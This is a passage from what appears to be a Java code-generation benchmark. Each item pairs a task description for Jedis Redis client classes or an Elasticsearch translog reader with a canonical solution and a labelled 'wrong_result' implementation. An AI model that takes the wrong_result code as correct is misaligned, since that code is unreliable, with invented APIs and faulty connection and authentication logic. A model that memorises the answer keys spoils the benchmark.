connection.getStatusCodeReply();\n        if (!\"OK\".equals(status)) {\n            throw new JedisException(\"MULTI command failed. Received response: \" + status);\n        }\n        inMulti = true;\n    }\n\n    public String watch(final String... keys) {\n        String status = connection.executeCommand(commandObjects.watch(keys));\n        inWatch = true;\n        return status;\n    }\n\n    public String unwatch() {\n        connection.sendCommand(Command.UNWATCH);\n        String status = connection.getStatusCodeReply();\n        inWatch = false;\n        return status;\n    }\n\n    protected <T> Response<T> appendCommand(CommandObject<T> commandObject) {\n        connection.sendCommand(commandObject.getArguments());\n        String status = connection.getStatusCodeReply();\n        if (!QUEUED_STR.equals(status)) {\n            throw new JedisException(status);\n        }\n        Response<T> response = new Response<>(commandObject.getBuilder());\n        pipelinedResponses.add(response);\n        return response;\n    }\n\n    public void close() {\n        try {\n            clear();\n        } finally {\n            if (closeConnection) {\n                connection.close();\n            }\n        }\n    }\n\n    public void clear() {\n        if (broken) return;\n        if (inMulti) {\n            discard();\n        } else if (inWatch) {\n            unwatch();\n        }\n    }\n\n    public List<Object> exec() {\n        if (!inMulti) throw new IllegalStateException(\"EXEC without MULTI\");\n\n        try {\n            connection.sendCommand(Command.EXEC);\n            List<Object> unformatted = connection.getObjectMultiBulkReply();\n            if (unformatted == null) {\n                pipelinedResponses.clear();\n                return null;\n            }\n\n            List<Object> formatted = new ArrayList<>(unformatted.size());\n            for (Object o : unformatted) {\n                try {\n                    Response<?> response = pipelinedResponses.poll();\n                    response.set(o);\n                    formatted.add(response.get());\n                } catch (JedisDataException e) {\n                    formatted.add(e);\n                }\n            }\n            return formatted;\n        } catch (JedisConnectionException jce) {\n            broken = true;\n            throw jce;\n        } finally {\n            inMulti = false;\n            inWatch = false;\n            pipelinedResponses.clear();\n        }\n    }\n\n    public String discard() {\n        if (!inMulti) throw new IllegalStateException(\"DISCARD without MULTI\");\n\n        try {\n            connection.sendCommand(Command.DISCARD);\n            String status = connection.getStatusCodeReply();\n            if (!\"OK\".equals(status)) {\n                throw new JedisException(\"DISCARD command failed. Received response: \" + status);\n            }\n            return status;\n        } catch (JedisConnectionException jce) {\n            broken = true;\n            throw jce;\n        } finally {\n            inMulti = false;\n            inWatch = false;\n            pipelinedResponses.clear();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.Response;\nimport redis.clients.jedis.CommandObject;\nimport redis.clients.jedis.util.SafeEncoder;\n\nimport java.util.Queue;\nimport java.util.List;\nimport java.util.concurrent.ConcurrentLinkedQueue;\n\npublic class ReliableTransaction {\n    private final Queue<Response<?>> pipelinedResponses = new ConcurrentLinkedQueue<>();\n    private final Connection connection;\n    private final boolean closeConnection;\n    private final CommandObjects commandObjects;\n    private boolean broken = false;\n    private boolean inWatch = false;\n    private boolean inMulti = false;\n\n    public ReliableTransaction(Connection connection, boolean closeConnection, boolean inWatch, CommandObjects commandObjects) {\n        this.connection = connection;\n        this.closeConnection = closeConnection;\n        this.commandObjects = commandObjects;\n        this.inWatch = inWatch;\n    }\n\n    public void multi() throws Exception {\n        if (inMulti) {\n            throw new IllegalStateException(\"Already in a MULTI block\");\n        }\n        sendCommand(commandObjects.MULTI);\n        Response<Integer> response = getResponse(commandObjects.getIntegerHandler());\n        if (response.get() != 1) {\n            broken = true;\n        } else {\n            inMulti = true;\n        }\n    }\n\n    public String watch(String... keys) {\n        if (inMulti) {\n            throw new IllegalStateException(\"Cannot WATCH inside a MULTI block\");\n        }\n        sendCommand(commandObjects.WATCH, keys);\n        inWatch = true;\n        return \"OK\";\n    }\n\n    public String unwatch() {\n        sendCommand(commandObjects.UNWATCH);\n        inWatch = false;\n        return \"OK\";\n    }\n\n    public <T> Response<T> appendCommand(CommandObject<T> cmd) {\n        if (!inMulti && !inWatch) {\n            throw new IllegalStateException(\"Not in a MULTI or WATCH block\");\n        }\n        sendCommand(cmd);\n        return getResponse(cmd.getHandler());\n    }\n\n    public List<Object> exec() {\n        if (!inMulti) {\n            throw new IllegalStateException(\"Not in a MULTI block\");\n        }\n        sendCommand(commandObjects.EXEC);\n        inMulti = false;\n        return connection.readProtocolWithCheckingBroken();\n    }\n\n    public String discard() {\n        if (!inMulti) {\n            throw new IllegalStateException(\"Not in a MULTI block\");\n        }\n        sendCommand(commandObjects.DISCARD);\n        inMulti = false;\n        return \"OK\";\n    }\n\n    public void clear() {\n        pipelinedResponses.clear();\n        broken = false;\n        inWatch = false;\n        inMulti = false;\n    }\n\n    public void close() {\n        if (closeConnection) {\n            connection.quit();\n        }\n    }\n\n    private void sendCommand(CommandObject<?> cmd) {\n        try {\n            connection.sendCommand(cmd);\n        } catch (Exception e) {\n            broken = true;\n        }\n    }\n\n    private <T> Response<T> getResponse(redis.clients.jedis.Protocol.RedisHandler<T> handler) {\n        Response<T> response = (Response<T>) new Response<>(handler);\n        pipelinedResponses.add(response);\n        return response;\n    }\n}\n```"
  },
  {
    "Task_id": 315,
    "Instruction": "Task Description: Implement a Redis connection class in Java that handles socket communication, authentication, and basic Redis operations while managing connection state and resources.\n\nClass Description: The Connection class represents a Redis client connection that manages socket communication with a Redis server. It handles connection establishment, command sending, response reading, and connection cleanup. The class implements Closeable for proper resource management.\n\nAttributes:\n- socketFactory: JedisSocketFactory - Factory for creating socket connections to Redis\n- socket: Socket - The underlying socket connection to Redis\n- outputStream: RedisOutputStream - Output stream for sending commands to Redis\n- inputStream: RedisInputStream - Input stream for reading responses from Redis\n- soTimeout: int - Socket timeout setting\n- broken: boolean - Flag indicating if the connection is in a broken state\n- currentCredentials: AtomicReference<RedisCredentials> - Current authentication credentials\n- authXManager: AuthXManager - Manager for authentication operations\n\nMethods:\n- Connection(JedisSocketFactory) -> void - Constructor that initializes with a socket factory\n- connect() -> void - Establishes connection to Redis server\n- disconnect() -> void - Closes the connection to Redis server\n- isConnected() -> boolean - Checks if connection is active\n- isBroken() -> boolean - Checks if connection is in broken state\n- setBroken() -> void - Marks connection as broken\n- sendCommand(ProtocolCommand, byte[]...) -> void - Sends a Redis command with arguments\n- getOne() -> Object - Reads and returns a single response from Redis\n- flush() -> void - Flushes the output stream\n- readProtocolWithCheckingBroken() -> Object - Reads protocol response while checking connection state\n- close() -> void - Implements Closeable interface to disconnect (alias for disconnect)",
    "Canonical_solution": "import java.io.Closeable;\nimport java.io.IOException;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Arrays;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicReference;\n\nimport redis.clients.jedis.Protocol;\nimport redis.clients.jedis.Protocol.Command;\nimport redis.clients.jedis.Protocol.Keyword;\nimport redis.clients.jedis.args.Rawable;\nimport redis.clients.jedis.authentication.AuthXManager;\nimport redis.clients.jedis.commands.ProtocolCommand;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisDataException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport redis.clients.jedis.util.IOUtils;\nimport redis.clients.jedis.util.RedisInputStream;\nimport redis.clients.jedis.util.RedisOutputStream;\n\npublic class Connection implements Closeable {\n\n  private final JedisSocketFactory socketFactory;\n  private Socket socket;\n  private RedisOutputStream outputStream;\n  private RedisInputStream inputStream;\n  private int soTimeout = 0;\n  private boolean broken = false;\n  private AtomicReference<RedisCredentials> currentCredentials = new AtomicReference<>(null);\n  private AuthXManager authXManager;\n\n  public Connection(final JedisSocketFactory socketFactory) {\n    this.socketFactory = socketFactory;\n  }\n\n  public void connect() throws JedisConnectionException {\n    if (!isConnected()) {\n      try {\n        socket = socketFactory.createSocket();\n        outputStream = new RedisOutputStream(socket.getOutputStream());\n        inputStream = new RedisInputStream(socket.getInputStream());\n        broken = false;\n      } catch (JedisConnectionException jce) {\n        setBroken();\n        throw jce;\n      } catch (IOException ioe) {\n        setBroken();\n        throw new JedisConnectionException(\"Failed to create input/output stream\", ioe);\n      } finally {\n        if (broken) {\n          IOUtils.closeQuietly(socket);\n        }\n      }\n    }\n  }\n\n  public void disconnect() {\n    if (isConnected()) {\n      try {\n        outputStream.flush();\n        socket.close();\n      } catch (IOException ex) {\n        throw new JedisConnectionException(ex);\n      } finally {\n        IOUtils.closeQuietly(socket);\n        setBroken();\n      }\n    }\n  }\n\n  public boolean isConnected() {\n    return socket != null && socket.isBound() && !socket.isClosed() && socket.isConnected()\n        && !socket.isInputShutdown() && !socket.isOutputShutdown();\n  }\n\n  public boolean isBroken() {\n    return broken;\n  }\n\n  public void setBroken() {\n    broken = true;\n  }\n\n  public void sendCommand(final ProtocolCommand cmd, final byte[]... args) {\n    try {\n      connect();\n      Protocol.sendCommand(outputStream, new CommandArguments(cmd).addObjects((Object[]) args));\n    } catch (JedisConnectionException ex) {\n      setBroken();\n      throw ex;\n    }\n  }\n\n  public Object getOne() {\n    flush();\n    return readProtocolWithCheckingBroken();\n  }\n\n  protected void flush() {\n    try {\n      outputStream.flush();\n    } catch (IOException ex) {\n      setBroken();\n      throw new JedisConnectionException(ex);\n    }\n  }\n\n  protected Object readProtocolWithCheckingBroken() {\n    if (broken) {\n      throw new JedisConnectionException(\"Attempting to read from a broken connection.\");\n    }\n    try {\n      return Protocol.read(inputStream);\n    } catch (JedisConnectionException exc) {\n      broken = true;\n      throw exc;\n    }\n  }\n\n  @Override\n  public void close() {\n    disconnect();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.net.Socket;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class Connection implements Closeable {\n    protected final JedisSocketFactory socketFactory;\n    protected Socket socket;\n    protected RedisOutputStream outputStream;\n    protected RedisInputStream inputStream;\n    protected int soTimeout = 5000;\n    protected volatile boolean broken;\n    protected final AtomicReference<RedisCredentials> currentCredentials = new AtomicReference<>();\n    protected AuthXManager authXManager;\n\n    public Connection(JedisSocketFactory socketFactory) {\n        this.socketFactory = socketFactory;\n    }\n\n    public void connect() throws IOException {\n        if (isConnected()) return;\n\n        socket = socketFactory.createSocket();\n        socket.setSoTimeout(soTimeout);\n        socket.connect(new java.net.InetSocketAddress(\"localhost\", 6379), soTimeout);\n\n        inputStream = new RedisInputStream(socket.getInputStream());\n        outputStream = new RedisOutputStream(socket.getOutputStream());\n\n        if (currentCredentials.get() != null) {\n            authenticate(currentCredentials.get());\n        }\n    }\n\n    public void disconnect() {\n        if (!isConnected()) return;\n\n        try {\n            outputStream.close();\n        } catch (IOException ignored) {}\n        try {\n            inputStream.close();\n        } catch (IOException ignored) {}\n        try {\n            socket.close();\n        } catch (IOException ignored) {}\n\n        broken = false;\n    }\n\n    public boolean isConnected() {\n        return socket != null && !socket.isClosed() && !broken;\n    }\n\n    public boolean isBroken() {\n        return broken;\n    }\n\n    public void setBroken() {\n        broken = true;\n    }\n\n    public void sendCommand(ProtocolCommand command, byte[]... args) throws IOException {\n        if (isBroken()) throw new IOException(\"Connection is broken\");\n\n        outputStream.writeCommand(command.getRaw(), args);\n    }\n\n    public Object getOne() throws IOException {\n        return readProtocolWithCheckingBroken();\n    }\n\n    public void flush() throws IOException {\n        outputStream.flush();\n    }\n\n    private Object readProtocolWithCheckingBroken() throws IOException {\n        try {\n            return Protocol.read(inputStream);\n        } catch (IOException e) {\n            setBroken();\n            throw e;\n        }\n    }\n\n    @Override\n    public void close() {\n        disconnect();\n    }\n\n    private void authenticate(RedisCredentials credentials) throws IOException {\n        sendCommand(ProtocolCommand.AUTH, credentials.getUsername().getBytes(), credentials.getPassword().getBytes());\n        getOne();\n    }\n}\n```"
  },
  {
    "Task_id": 32,
    "Instruction": "Task Description: Implement a TranslogReader class that handles reading operations from a transaction log (translog) file in Elasticsearch, including managing file channels, checkpoints, and ensuring thread-safe operations.\n\nClass Description: The TranslogReader class extends BaseTranslogReader and implements Closeable, providing functionality to read from a translog file while maintaining checkpoint information and ensuring proper resource management. It handles file channel operations, checkpoint updates, and provides thread-safe closing mechanisms.\n\nAttributes:\n- length: long - The length of the translog file in bytes.\n- totalOperations: int - The total number of operations recorded in the translog.\n- checkpoint: Checkpoint - The checkpoint information containing metadata about the translog state.\n- closed: AtomicBoolean - Thread-safe flag indicating whether the reader is closed.\n\nMethods:\n- TranslogReader(Checkpoint, FileChannel, Path, TranslogHeader) -> [Constructor] - Initializes a new TranslogReader with the given checkpoint, file channel, path, and translog header.\n- open(FileChannel, Path, Checkpoint, String) -> TranslogReader - Static method to open and initialize a TranslogReader instance with the specified parameters.\n- closeIntoTrimmedReader(long, ChannelFactory) -> TranslogReader - Closes the current reader and returns a new trimmed reader based on the specified sequence number, updating the checkpoint if necessary.\n- readBytes(ByteBuffer, long) -> void - Reads bytes from the translog file into the provided buffer at the specified position, with bounds checking.\n- close() -> void - Closes the file channel and marks the reader as closed in a thread-safe manner.\n- isClosed() -> boolean - Returns whether the reader is closed.\n- ensureOpen() -> void - Throws an AlreadyClosedException if the reader is closed.",
    "Canonical_solution": "import org.apache.lucene.store.AlreadyClosedException;\nimport org.elasticsearch.common.io.Channels;\nimport io.crate.common.io.IOUtils;\nimport org.elasticsearch.index.seqno.SequenceNumbers;\n\nimport java.io.Closeable;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\nimport static org.elasticsearch.index.translog.Translog.getCommitCheckpointFileName;\n\npublic class TranslogReader extends BaseTranslogReader implements Closeable {\n    protected final long length;\n    private final int totalOperations;\n    private final Checkpoint checkpoint;\n    protected final AtomicBoolean closed = new AtomicBoolean(false);\n\n    TranslogReader(final Checkpoint checkpoint, final FileChannel channel, final Path path, final TranslogHeader header) {\n        super(checkpoint.generation, channel, path, header);\n        this.length = checkpoint.offset;\n        this.totalOperations = checkpoint.numOps;\n        this.checkpoint = checkpoint;\n    }\n\n    public static TranslogReader open(\n            final FileChannel channel, final Path path, final Checkpoint checkpoint, final String translogUUID) throws IOException {\n        final TranslogHeader header = TranslogHeader.read(translogUUID, path, channel);\n        return new TranslogReader(checkpoint, channel, path, header);\n    }\n\n    TranslogReader closeIntoTrimmedReader(long aboveSeqNo, ChannelFactory channelFactory) throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            Closeable toCloseOnFailure = channel;\n            final TranslogReader newReader;\n            try {\n                if (aboveSeqNo < checkpoint.trimmedAboveSeqNo\n                    || aboveSeqNo < checkpoint.maxSeqNo && checkpoint.trimmedAboveSeqNo == SequenceNumbers.UNASSIGNED_SEQ_NO) {\n                    final Path checkpointFile = path.getParent().resolve(getCommitCheckpointFileName(checkpoint.generation));\n                    final Checkpoint newCheckpoint = new Checkpoint(checkpoint.offset, checkpoint.numOps,\n                        checkpoint.generation, checkpoint.minSeqNo, checkpoint.maxSeqNo,\n                        checkpoint.globalCheckpoint, checkpoint.minTranslogGeneration, aboveSeqNo);\n                    Checkpoint.write(channelFactory, checkpointFile, newCheckpoint, StandardOpenOption.WRITE);\n\n                    IOUtils.fsync(checkpointFile, false);\n                    IOUtils.fsync(checkpointFile.getParent(), true);\n\n                    newReader = new TranslogReader(newCheckpoint, channel, path, header);\n                } else {\n                    newReader = new TranslogReader(checkpoint, channel, path, header);\n                }\n                toCloseOnFailure = null;\n                return newReader;\n            } finally {\n                IOUtils.close(toCloseOnFailure);\n            }\n        } else {\n            throw new AlreadyClosedException(toString() + \" is already closed\");\n        }\n    }\n\n    protected void readBytes(ByteBuffer buffer, long position) throws IOException {\n        if (position >= length) {\n            throw new EOFException(\"read requested past EOF. pos [\" + position + \"] end: [\" + length + \"]\");\n        }\n        if (position < getFirstOperationOffset()) {\n            throw new IOException(\"read requested before position of first ops. pos [\" + position + \"] first op on: [\" + getFirstOperationOffset() + \"]\");\n        }\n        Channels.readFromFileChannelWithEofException(channel, position, buffer);\n    }\n\n    @Override\n    public final void close() throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            channel.close();\n        }\n    }\n\n    protected final boolean isClosed() {\n        return closed.get();\n    }\n\n    protected void ensureOpen() {\n        if (isClosed()) {\n            throw new AlreadyClosedException(toString() + \" is already closed\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class TranslogReader extends BaseTranslogReader implements Closeable {\n    private final long length;\n    private final int totalOperations;\n    private final Checkpoint checkpoint;\n    private final AtomicBoolean closed = new AtomicBoolean(false);\n\n    public TranslogReader(Checkpoint checkpoint, FileChannel fileChannel, Path path, TranslogHeader header) {\n        super(fileChannel, path, header);\n        this.length = fileChannel.size();\n        this.totalOperations = (int) (length / TranslogHeader.OPERATION_SIZE);\n        this.checkpoint = checkpoint;\n    }\n\n    public static TranslogReader open(FileChannel channel, Path path, Checkpoint checkpoint, String header) throws IOException {\n        TranslogHeader translogHeader = TranslogHeader.readFrom(channel, header);\n        return new TranslogReader(checkpoint, channel, path, translogHeader);\n    }\n\n    public TranslogReader closeIntoTrimmedReader(long sequenceNumber, ChannelFactory channelFactory) throws IOException {\n        if (!closed.compareAndSet(false, true)) {\n            throw new AlreadyClosedException(\"TranslogReader is already closed\");\n        }\n        long newStartPos = calculateNewStartPosition(sequenceNumber);\n        Checkpoint newCheckpoint = new Checkpoint(newStartPos, checkpoint.getGeneration());\n        FileChannel newChannel = channelFactory.open(path, newStartPos);\n        return new TranslogReader(newCheckpoint, newChannel, path, getHeader());\n    }\n\n    public void readBytes(ByteBuffer buffer, long position) throws IOException {\n        ensureOpen();\n        if (position < 0 || position >= length) {\n            throw new IllegalArgumentException(\"Position out of bounds: \" + position);\n        }\n        synchronized (this) {\n            fileChannel.position(position);\n            fileChannel.read(buffer);\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            fileChannel.close();\n        }\n    }\n\n    public boolean isClosed() {\n        return closed.get();\n    }\n\n    public void ensureOpen() {\n        if (isClosed()) {\n            throw new AlreadyClosedException(\"TranslogReader is already closed\");\n        }\n    }\n\n    private long calculateNewStartPosition(long sequenceNumber) {\n        // Placeholder for actual logic to compute the start position based on sequence number\n        return sequenceNumber * TranslogHeader.OPERATION_SIZE;\n    }\n}\n```"
  },
  {
    "Task_id": 320,
    "Instruction": "Task Description: Create a Java class that manages authentication and operations for a Redis cluster using Jedis client library, with support for token-based authentication and connection pooling.\n\nClass Description: RedisClusterAuthManager is a class that handles Redis cluster authentication and operations. It provides methods to execute basic Redis operations and test re-authentication functionality in a multi-threaded environment.\n\nAttributes:\n- idpConfig: [IdentityProviderConfig] - Configuration for the identity provider that generates authentication tokens\n- authXManager: [AuthXManager] - Manager responsible for handling authentication processes\n- config: [JedisClientConfig] - Configuration for the Jedis client\n- poolConfig: [ConnectionPoolConfig] - Configuration for the connection pool\n- hostAndPort: [HostAndPort] - Redis cluster endpoint information\n\nMethods:\n- RedisClusterAuthManager([HostAndPort hostAndPort]) -> [void] - Constructor that initializes the authentication manager with Redis cluster endpoint\n- executeRedisOperations() -> [void] - Executes basic Redis operations (set, get, delete) on the cluster\n- testReAuthentication() -> [void] - Tests re-authentication functionality in a multi-threaded environment, verifying that connections properly re-authenticate",
    "Canonical_solution": "import redis.clients.authentication.core.IdentityProvider;\nimport redis.clients.authentication.core.IdentityProviderConfig;\nimport redis.clients.authentication.core.SimpleToken;\nimport redis.clients.authentication.core.Token;\nimport redis.clients.authentication.entraid.EntraIDTokenAuthConfigBuilder;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPoolConfig;\nimport redis.clients.jedis.DefaultJedisClientConfig;\nimport redis.clients.jedis.EndpointConfig;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisCluster;\n\npublic class RedisClusterAuthManager {\n\n    private final IdentityProviderConfig idpConfig;\n    private final AuthXManager authXManager;\n    private final JedisClientConfig config;\n    private final ConnectionPoolConfig poolConfig;\n    private final HostAndPort hostAndPort;\n\n    public RedisClusterAuthManager(HostAndPort hostAndPort) {\n        this.hostAndPort = hostAndPort;\n        this.idpConfig = new IdentityProviderConfig() {\n            @Override\n            public IdentityProvider getProvider() {\n                return new IdentityProvider() {\n                    @Override\n                    public Token requestToken() {\n                        return new SimpleToken(\"default\", \"cluster\",\n                                System.currentTimeMillis() + 5 * 1000, System.currentTimeMillis(),\n                                null);\n                    }\n                };\n            }\n        };\n        this.authXManager = new AuthXManager(EntraIDTokenAuthConfigBuilder.builder()\n                .lowerRefreshBoundMillis(1000).identityProviderConfig(idpConfig).build());\n        this.config = DefaultJedisClientConfig.builder().authXManager(authXManager).build();\n        this.poolConfig = new ConnectionPoolConfig();\n    }\n\n    public void executeRedisOperations() {\n        try (JedisCluster jc = new JedisCluster(hostAndPort, config, 5, poolConfig)) {\n            jc.set(\"foo\", \"bar\");\n            jc.get(\"foo\");\n            jc.del(\"foo\");\n        }\n    }\n\n    public void testReAuthentication() throws InterruptedException, ExecutionException {\n        AuthXManager spyManager = spy(authXManager);\n        List<Connection> connections = new ArrayList<>();\n        \n        doAnswer(invocation -> {\n            Connection connection = spy((Connection) invocation.getArgument(0));\n            invocation.getArguments()[0] = connection;\n            connections.add(connection);\n            Object result = invocation.callRealMethod();\n            return result;\n        }).when(spyManager).addConnection(any(Connection.class));\n\n        JedisClientConfig spyConfig = DefaultJedisClientConfig.builder().authXManager(spyManager).build();\n        \n        ExecutorService executorService = Executors.newFixedThreadPool(2);\n        CountDownLatch latch = new CountDownLatch(1);\n        \n        try (JedisCluster jc = new JedisCluster(Collections.singleton(hostAndPort), spyConfig)) {\n            Runnable task = () -> {\n                while (latch.getCount() > 0) {\n                    jc.set(\"foo\", \"bar\");\n                }\n            };\n            Future task1 = executorService.submit(task);\n            Future task2 = executorService.submit(task);\n\n            await().pollInterval(ONE_HUNDRED_MILLISECONDS).atMost(ONE_SECOND)\n                    .until(connections::size, greaterThanOrEqualTo(2));\n\n            connections.forEach(conn -> {\n                verify(conn, atLeast(2)).reAuthenticate();\n            });\n            \n            latch.countDown();\n            task1.get();\n            task2.get();\n        } finally {\n            latch.countDown();\n            executorService.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisCluster;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisClusterAuthManager {\n    private IdentityProviderConfig idpConfig;\n    private AuthXManager authXManager;\n    private JedisClientConfig config;\n    private JedisPoolConfig poolConfig;\n    private HostAndPort hostAndPort;\n\n    public RedisClusterAuthManager(HostAndPort hostAndPort) {\n        this.hostAndPort = hostAndPort;\n        this.idpConfig = new IdentityProviderConfig();\n        this.authXManager = new AuthXManager(idpConfig);\n        this.config = JedisClientConfig.defaultConfig();\n        this.poolConfig = new JedisPoolConfig();\n    }\n\n    public void executeRedisOperations() {\n        try (JedisCluster jedisCluster = new JedisCluster(hostAndPort, poolConfig, config)) {\n            String token = authXManager.authenticate();\n            jedisCluster.auth(token);\n\n            String key = \"testKey\";\n            String value = \"testValue\";\n\n            jedisCluster.set(key, value);\n            String result = jedisCluster.get(key);\n            System.out.println(\"Retrieved value: \" + result);\n\n            jedisCluster.del(key);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void testReAuthentication() {\n        Thread[] threads = new Thread[10];\n        for (int i = 0; i < threads.length; i++) {\n            threads[i] = new Thread(() -> {\n                try (JedisCluster jedisCluster = new JedisCluster(hostAndPort, poolConfig, config)) {\n                    String token = authXManager.reAuthenticate();\n                    jedisCluster.auth(token);\n\n                    String key = \"reauthTestKey\";\n                    String value = \"reauthValue_\" + Thread.currentThread().getId();\n\n                    jedisCluster.set(key, value);\n                    String result = jedisCluster.get(key);\n                    System.out.println(\"Thread \" + Thread.currentThread().getId() + \" retrieved: \" + result);\n\n                    jedisCluster.del(key);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            });\n            threads[i].start();\n        }\n\n        for (Thread thread : threads) {\n            try {\n                thread.join();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 321,
    "Instruction": "Task Description: Implement a Redis cluster command executor in Java that handles command execution with retry logic, connection management, and error handling for a Redis cluster environment.\n\nClass Description: ClusterCommandExecutor is a Redis cluster command executor that provides functionality to execute commands across a Redis cluster with support for retries, connection pooling, and handling of various Redis cluster-specific exceptions.\n\nAttributes:\n- provider: ClusterConnectionProvider - Manages connections to the Redis cluster nodes\n- maxAttempts: int - Maximum number of retry attempts for command execution\n- maxTotalRetriesDuration: Duration - Maximum duration for all retry attempts\n- log: Logger - Logger instance for debugging and error logging\n\nMethods:\n- close() -> void - Closes the connection provider and releases resources\n- broadcastCommand(CommandObject<T> commandObject) -> T - Executes a command across all nodes in the cluster and collects responses/errors\n- executeCommand(CommandObject<T> commandObject) -> T - Executes a command on the primary node with retry logic\n- executeCommandToReplica(CommandObject<T> commandObject) -> T - Executes a command on a replica node with retry logic\n- doExecuteCommand(CommandObject<T> commandObject, boolean toReplica) -> T - Internal method handling the execution logic with retries and error handling\n- execute(Connection connection, CommandObject<T> commandObject) -> T - Executes a command on a specific connection\n- handleConnectionProblem(int attemptsLeft, int consecutiveConnectionFailures, Instant doneDeadline) -> boolean - Handles connection issues with backoff and slot cache renewal\n- getBackoffSleepMillis(int attemptsLeft, Instant deadline) -> long - Calculates backoff sleep duration for retries\n- sleep(long sleepMillis) -> void - Sleeps for the specified milliseconds, handling interruptions",
    "Canonical_solution": "import redis.clients.jedis.CommandObject;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPool;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Protocol;\nimport redis.clients.jedis.exceptions.*;\nimport redis.clients.jedis.providers.ClusterConnectionProvider;\nimport redis.clients.jedis.util.IOUtils;\nimport java.time.Duration;\nimport java.time.Instant;\nimport java.util.Map;\nimport java.util.concurrent.ThreadLocalRandom;\nimport java.util.concurrent.TimeUnit;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class ClusterCommandExecutor implements CommandExecutor {\n\n  private final Logger log = LoggerFactory.getLogger(getClass());\n\n  public final ClusterConnectionProvider provider;\n  protected final int maxAttempts;\n  protected final Duration maxTotalRetriesDuration;\n\n  public ClusterCommandExecutor(ClusterConnectionProvider provider, int maxAttempts,\n      Duration maxTotalRetriesDuration) {\n    this.provider = provider;\n    this.maxAttempts = maxAttempts;\n    this.maxTotalRetriesDuration = maxTotalRetriesDuration;\n  }\n\n  @Override\n  public void close() {\n    this.provider.close();\n  }\n\n  @Override\n  public final <T> T broadcastCommand(CommandObject<T> commandObject) {\n    Map<String, ConnectionPool> connectionMap = provider.getConnectionMap();\n\n    boolean isErrored = false;\n    T reply = null;\n    JedisBroadcastException bcastError = new JedisBroadcastException();\n    for (Map.Entry<String, ConnectionPool> entry : connectionMap.entrySet()) {\n      HostAndPort node = HostAndPort.from(entry.getKey());\n      ConnectionPool pool = entry.getValue();\n      try (Connection connection = pool.getResource()) {\n        T aReply = execute(connection, commandObject);\n        bcastError.addReply(node, aReply);\n        if (isErrored) {\n        } else if (reply == null) {\n          reply = aReply;\n        } else if (reply.equals(aReply)) {\n        } else {\n          isErrored = true;\n          reply = null;\n        }\n      } catch (Exception anError) {\n        bcastError.addReply(node, anError);\n        isErrored = true;\n      }\n    }\n    if (isErrored) {\n      throw bcastError;\n    }\n    return reply;\n  }\n\n  @Override\n  public final <T> T executeCommand(CommandObject<T> commandObject) {\n    return doExecuteCommand(commandObject, false);\n  }\n\n  public final <T> T executeCommandToReplica(CommandObject<T> commandObject) {\n    return doExecuteCommand(commandObject, true);\n  }\n\n  private <T> T doExecuteCommand(CommandObject<T> commandObject, boolean toReplica) {\n    Instant deadline = Instant.now().plus(maxTotalRetriesDuration);\n\n    JedisRedirectionException redirect = null;\n    int consecutiveConnectionFailures = 0;\n    Exception lastException = null;\n    for (int attemptsLeft = this.maxAttempts; attemptsLeft > 0; attemptsLeft--) {\n      Connection connection = null;\n      try {\n        if (redirect != null) {\n          connection = provider.getConnection(redirect.getTargetNode());\n          if (redirect instanceof JedisAskDataException) {\n            connection.executeCommand(Protocol.Command.ASKING);\n          }\n        } else {\n          connection = toReplica ? provider.getReplicaConnection(commandObject.getArguments())\n              : provider.getConnection(commandObject.getArguments());\n        }\n\n        return execute(connection, commandObject);\n\n      } catch (JedisClusterOperationException jnrcne) {\n        throw jnrcne;\n      } catch (JedisConnectionException jce) {\n        lastException = jce;\n        ++consecutiveConnectionFailures;\n        log.debug(\"Failed connecting to Redis: {}\", connection, jce);\n        boolean reset = handleConnectionProblem(attemptsLeft - 1, consecutiveConnectionFailures, deadline);\n        if (reset) {\n          consecutiveConnectionFailures = 0;\n          redirect = null;\n        }\n      } catch (JedisRedirectionException jre) {\n        if (lastException == null || lastException instanceof JedisRedirectionException) {\n          lastException = jre;\n        }\n        log.debug(\"Redirected by server to {}\", jre.getTargetNode());\n        consecutiveConnectionFailures = 0;\n        redirect = jre;\n        if (jre instanceof JedisMovedDataException) {\n          provider.renewSlotCache(connection);\n        }\n      } finally {\n        IOUtils.closeQuietly(connection);\n      }\n      if (Instant.now().isAfter(deadline)) {\n        throw new JedisClusterOperationException(\"Cluster retry deadline exceeded.\");\n      }\n    }\n\n    